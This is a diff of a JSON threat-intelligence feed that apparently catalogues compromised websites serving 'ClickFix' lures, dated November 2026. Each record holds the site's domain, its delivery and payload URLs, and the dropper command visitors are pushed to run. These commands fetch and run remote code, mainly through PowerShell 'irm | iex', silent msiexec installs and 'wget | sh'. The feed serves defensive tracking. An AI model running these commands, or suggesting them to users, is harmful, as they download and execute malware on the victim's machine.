@@ -1,5 +1,249 @@
 [
   {
+    "UrlDomain": "nmengineering.co.za",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/click/41422c4edd1735b5"
+    ],
+    "IP": [
+      "102.130.117.48"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/click/41422c4edd1735b5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/click/41422c4edd1735b5"
+    ],
+    "ReportId": "cmwfqf7a40ivv0oml8u89k1od",
+    "ScannedAt": "2026-11-14T01:33:36.554000+00:00"
+  },
+  {
+    "UrlDomain": "www.mediweld.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.52"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/5f16a861fec93d5c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29910323",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/5f16a861fec93d5c"
+    ],
+    "ReportId": "cmwfq2sdt0iq70omlfqlpffxx",
+    "ScannedAt": "2026-11-14T01:23:57.427000+00:00"
+  },
+  {
+    "UrlDomain": "kirketerpthaarup.dk",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "46.30.213.96"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwfpywm20ikw0omloshmzs1c",
+    "ScannedAt": "2026-11-14T01:20:56.286000+00:00"
+  },
+  {
+    "UrlDomain": "20wawo30.com",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "IP": [
+      "153.127.54.82"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "ReportId": "cmwfpwgss0ihy0omlygayvwid",
+    "ScannedAt": "2026-11-14T01:19:02.441000+00:00"
+  },
+  {
+    "UrlDomain": "update.sportela.bg",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "78.142.63.182"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwfo93tk0gqe0oml1kpi8kea",
+    "ScannedAt": "2026-11-14T00:32:52.943000+00:00"
+  },
+  {
+    "UrlDomain": "mattsphotos.com.au",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "65.21.135.42"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwfcanbl0gd80omlgekvfmd3",
+    "ScannedAt": "2026-11-13T18:58:09.495000+00:00"
+  },
+  {
+    "UrlDomain": "freeon.com.tr",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "script-six-tawny.vercel.app",
+      "2ffreeon.com.tr"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec"
+    ],
+    "IP": [
+      "46.202.172.35"
+    ],
+    "Related": [
+      {
+        "Value": "https://muddledramblings.com/table-of-css3-border-radius-compliance",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=c359958e-4895-48f0-a73c-f65ab1e9296e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ffreeon.com.tr%2F&os=Linux%20x86_64&lastVisitAt=2026-11-13T18%3A26%3A50.782Z&lastShellAt=2026-11-13T18%3A26%3A50.782Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwfb87f30g8x0omlp6pbqff9",
+    "ScannedAt": "2026-11-13T18:28:15.921000+00:00"
+  },
+  {
+    "UrlDomain": "www.test20.russvpn.online",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "188.137.249.237"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      },
+      {
+        "Value": "a",
+        "Type": "Hostname"
+      },
+      {
+        "Value": "b",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f"
+    ],
+    "ReportId": "cmwfatb1y0fzr0oml1jpy5rwb",
+    "ScannedAt": "2026-11-13T18:16:40.814000+00:00"
+  },
+  {
+    "UrlDomain": "totoeuropeo.altervista.org",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "23.88.74.60"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwfasa7u0fyp0omllxgx5jhg",
+    "ScannedAt": "2026-11-13T18:15:53.072000+00:00"
+  },
+  {
+    "UrlDomain": "danorge.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/8751569bda6b597f",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/8751569bda6b597f'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/8751569bda6b597f"
+    ],
+    "ReportId": "cmwfarrwk0fv70oml64i0nnlm",
+    "ScannedAt": "2026-11-13T18:15:29.326000+00:00"
+  },
+  {
+    "UrlDomain": "www.customer-service.dukayouthledorganization.org",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "192.250.229.83"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      },
+      {
+        "Value": "n",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f"
+    ],
+    "ReportId": "cmwfarq1i0fv30oml7sg6ahis",
+    "ScannedAt": "2026-11-13T18:15:25.997000+00:00"
+  },
+  {
     "UrlDomain": "flashingdocs.com",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
@@ -355,1155 +599,5 @@
     ],
     "ReportId": "cmwerxwap0e0d0omlo90ozon6",
     "ScannedAt": "2026-11-13T09:28:22.206000+00:00"
-  },
-  {
-    "UrlDomain": "camillesuarez.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "199.188.200.146"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwel9plu0czo0omlez5ttanw",
-    "ScannedAt": "2026-11-13T06:21:36.065000+00:00"
-  },
-  {
-    "UrlDomain": "www.ticconsulting.ma",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "109.234.162.18"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/4a27-e3b8-4863-8d49-fc408649faef/-/raw/main/d9-4f53-8f7a-6a6104bff2af | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/4a27-e3b8-4863-8d49-fc408649faef/-/raw/main/d9-4f53-8f7a-6a6104bff2af"
-    ],
-    "ReportId": "cmwekfqsd0ciq0omld5n99u1h",
-    "ScannedAt": "2026-11-13T05:58:18.016000+00:00"
-  },
-  {
-    "UrlDomain": "realtorpuneetjindal.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.83.156"
-    ],
-    "Related": [
-      {
-        "Value": "https://wa.me/919888700780",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=700&q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=700&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1512917774080-9991f1c4c750?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1580587771525-78b9dba3b914?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1613977257363-707ba9348227?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1605276374104-dee2a0ed3cd6?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1564013799919-ab600027ffc6?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://images.unsplash.com/photo-1501183638710-841dd1904471?w=600&amp;q=80",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://maps.app.goo.gl/ebkeymw2ngpsgkyea?g_st=ic",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/3d88e2e0aa08ee9b",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=55cf111d272f51001d0c68612e78ea1fd5438401d3267f77&amp;_v=29909120",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/3d88e2e0aa08ee9b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/3d88e2e0aa08ee9b"
-    ],
-    "ReportId": "cmwej31qk0cf00omlfkkf1xkc",
-    "ScannedAt": "2026-11-13T05:20:26.050000+00:00"
-  },
-  {
-    "UrlDomain": "unnorte.digital",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.203.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/aa57ea23162442f3",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/aa57ea23162442f3'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/aa57ea23162442f3"
-    ],
-    "ReportId": "cmwebrdpf0c2l0omlh3h75cni",
-    "ScannedAt": "2026-11-13T01:55:24.301000+00:00"
-  },
-  {
-    "UrlDomain": "lawservices.al",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "91.108.98.152"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwebebjc0c1o0oml57p74iht",
-    "ScannedAt": "2026-11-13T01:45:15.056000+00:00"
-  },
-  {
-    "UrlDomain": "www.w-z-o.org",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "5.134.12.33"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/f141a3fc3b742e21",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/f141a3fc3b742e21"
-    ],
-    "ReportId": "cmwean10w0btt0omla09v8y3l",
-    "ScannedAt": "2026-11-13T01:24:01.621000+00:00"
-  },
-  {
-    "UrlDomain": "auximetal.es",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "217.160.0.233"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/b588d19d7447a34f",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=ccb41636296169d7f3694c14278c71af6279af9c3e8d68ea&amp;_v=29908882",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/b588d19d7447a34f'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/b588d19d7447a34f"
-    ],
-    "ReportId": "cmweam9ea0bq60omlc6wn3tdt",
-    "ScannedAt": "2026-11-13T01:23:25.880000+00:00"
-  },
-  {
-    "UrlDomain": "agdaghafriyat.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "94.138.202.100"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/517644a705a49caa",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29908882",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29908882",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/517644a705a49caa'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/517644a705a49caa"
-    ],
-    "ReportId": "cmweam8mu0bq30oml9mwud97d",
-    "ScannedAt": "2026-11-13T01:23:24.624000+00:00"
-  },
-  {
-    "UrlDomain": "www.cinepassionmeyzieu.com",
-    "DeliveryUrl": [
-      "rosrefurboss.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x",
-      "https://platform.twitter.com/jot.html"
-    ],
-    "IP": [
-      "109.234.162.44"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmweaigu40bil0omlfmyycqdj",
-    "ScannedAt": "2026-11-13T01:20:28.910000+00:00"
-  },
-  {
-    "UrlDomain": "expertlightinginc.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "68.178.190.139"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwea9wm70b9q0oml4v5kca0d",
-    "ScannedAt": "2026-11-13T01:13:49.446000+00:00"
-  },
-  {
-    "UrlDomain": "467media.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "107.180.2.62"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwea5lgf0b6n0omlk8sgo9nq",
-    "ScannedAt": "2026-11-13T01:10:28.381000+00:00"
-  },
-  {
-    "UrlDomain": "alfajarind.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/697d6fc32c5c3147"
-    ],
-    "IP": [
-      "192.185.57.139"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/697d6fc32c5c3147')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/697d6fc32c5c3147"
-    ],
-    "ReportId": "cmwe9i80d0ahm0oml42mzaj6h",
-    "ScannedAt": "2026-11-13T00:52:17.461000+00:00"
-  },
-  {
-    "UrlDomain": "growthbrand.com.br",
-    "DeliveryUrl": [],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "186.209.113.111"
-    ],
-    "Related": [
-      {
-        "Value": "softsyncizobrazie.net",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe9h7c80ael0oml442l41bk",
-    "ScannedAt": "2026-11-13T00:51:30.305000+00:00"
-  },
-  {
-    "UrlDomain": "ms-ks.net",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "160.251.151.172"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe9gaoh0adf0omlnltwf2ue",
-    "ScannedAt": "2026-11-13T00:50:48.005000+00:00"
-  },
-  {
-    "UrlDomain": "mientinhgiac.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/f65ffb293ce4cc02"
-    ],
-    "IP": [
-      "103.82.26.141"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/f65ffb293ce4cc02')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/f65ffb293ce4cc02"
-    ],
-    "ReportId": "cmwe9et4u0aaj0omlc9yh4b8o",
-    "ScannedAt": "2026-11-13T00:49:38.604000+00:00"
-  },
-  {
-    "UrlDomain": "time2heal.ing",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/e12ead22eabdc1f7"
-    ],
-    "IP": [
-      "150.239.12.100"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/e12ead22eabdc1f7')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/e12ead22eabdc1f7"
-    ],
-    "ReportId": "cmwe9dwa00a7d0omlcfzlo17c",
-    "ScannedAt": "2026-11-13T00:48:56+00:00"
-  },
-  {
-    "UrlDomain": "edwardslegalsocal.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "162.241.24.143"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe9dsyc0a6j0oml5eqqsnye",
-    "ScannedAt": "2026-11-13T00:48:51.651000+00:00"
-  },
-  {
-    "UrlDomain": "blueprism-showcase.co.uk",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/6d15d8b4abf7e533"
-    ],
-    "IP": [
-      "134.209.181.134"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/6d15d8b4abf7e533')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/6d15d8b4abf7e533"
-    ],
-    "ReportId": "cmwe9ddjx0a5q0omlhkismcwu",
-    "ScannedAt": "2026-11-13T00:48:31.775000+00:00"
-  },
-  {
-    "UrlDomain": "3years-10million.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/14da35a99099ddf9"
-    ],
-    "IP": [
-      "133.18.34.43"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/14da35a99099ddf9')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/14da35a99099ddf9"
-    ],
-    "ReportId": "cmwe9cec60a4v0oml0v3gxrdu",
-    "ScannedAt": "2026-11-13T00:47:45.776000+00:00"
-  },
-  {
-    "UrlDomain": "elrozinteriors.in",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/515e7592fa3dc4df"
-    ],
-    "IP": [
-      "157.66.118.66"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/515e7592fa3dc4df')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/515e7592fa3dc4df"
-    ],
-    "ReportId": "cmwe9bpga0a460omlg28m2km0",
-    "ScannedAt": "2026-11-13T00:47:13.873000+00:00"
-  },
-  {
-    "UrlDomain": "dground55.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/7013b8a0c080df79"
-    ],
-    "IP": [
-      "157.7.189.188"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/7013b8a0c080df79')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/7013b8a0c080df79"
-    ],
-    "ReportId": "cmwe9bjg00a3j0oml6v33yzhq",
-    "ScannedAt": "2026-11-13T00:47:05.659000+00:00"
-  },
-  {
-    "UrlDomain": "t3dfleet.com",
-    "DeliveryUrl": [
-      "gfisoda.biz"
-    ],
-    "PayloadUrl": [
-      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
-    ],
-    "IP": [
-      "160.153.0.61"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
-    ],
-    "ReportId": "cmwe912g309r10oml56qzo8en",
-    "ScannedAt": "2026-11-13T00:38:57.467000+00:00"
-  },
-  {
-    "UrlDomain": "lauradesing.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "69.10.33.22"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe8utpz09hc0omldgg04ffd",
-    "ScannedAt": "2026-11-13T00:34:06.241000+00:00"
-  },
-  {
-    "UrlDomain": "www.syncsectorpress.com",
-    "DeliveryUrl": [
-      "salesmarkllc.com",
-      "bingixllc.com"
-    ],
-    "PayloadUrl": [
-      "https://bingixllc.com/ztidwuofz51siqj6"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://salesmarkllc.com/1p8ma2fruuuqac52?_=1794528686348",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "powershell -nop -c \\\"$f=$env:TEMP+'\\\\clakr.ps1';curl.exe -sk -o $f 'https://bingixllc[.]com/ztIDWUOFZ51SiqJ6';powershell -ep bypass -File $f\\\"",
-    "ResolvedDownloadUrl": [
-      "https://bingixllc.com/ztIDWUOFZ51SiqJ6"
-    ],
-    "ReportId": "cmwe828jj08m80omlzcgd7pm1",
-    "ScannedAt": "2026-11-13T00:11:52.429000+00:00"
-  },
-  {
-    "UrlDomain": "bistrowhynot.de",
-    "DeliveryUrl": [
-      "rosrefurboss.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "89.110.145.43"
-    ],
-    "Related": [
-      {
-        "Value": "https://rosrefurboss.com/inline.php",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe81gep08kc0omlw78d528q",
-    "ScannedAt": "2026-11-13T00:11:15.970000+00:00"
-  },
-  {
-    "UrlDomain": "robinmack.com",
-    "DeliveryUrl": [
-      "klonfcrtyseaflow.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "192.254.225.208"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe7sk0008dh0omlccbh502j",
-    "ScannedAt": "2026-11-13T00:04:20.730000+00:00"
-  },
-  {
-    "UrlDomain": "www.routedesmetiers.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/61bc1e20936221ce"
-    ],
-    "IP": [
-      "109.234.161.39"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/61bc1e20936221ce')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/61bc1e20936221ce"
-    ],
-    "ReportId": "cmwe7r7jj08cs0oml2ruzlbeh",
-    "ScannedAt": "2026-11-13T00:03:17.928000+00:00"
-  },
-  {
-    "UrlDomain": "selltrade.app",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/ba63cf9b5b2960f2"
-    ],
-    "IP": [
